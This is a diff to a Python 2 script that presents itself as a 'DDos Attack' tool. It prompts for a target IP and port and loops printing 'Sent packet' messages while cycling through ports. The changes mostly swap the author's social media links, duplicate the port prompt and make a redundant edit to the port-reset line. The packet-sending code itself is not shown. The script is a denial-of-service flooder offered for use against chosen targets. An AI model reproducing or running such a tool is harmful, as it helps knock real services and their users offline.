@@ -21,11 +21,11 @@ os.system("clear")
 os.system("figlet DDos Attack")
 print
 print "Author   : HelloMyFriend"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
 print "github   : https://github.com/bossy0"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Facebook : https://www.facebook.com/Bossy.078"
 print
 ip = raw_input("IP Target : ")
+port = input("Port       : ")
 port = input("Port       : ")
 
 os.system("clear")
@@ -49,4 +49,4 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-       port = 2
+       port = 1
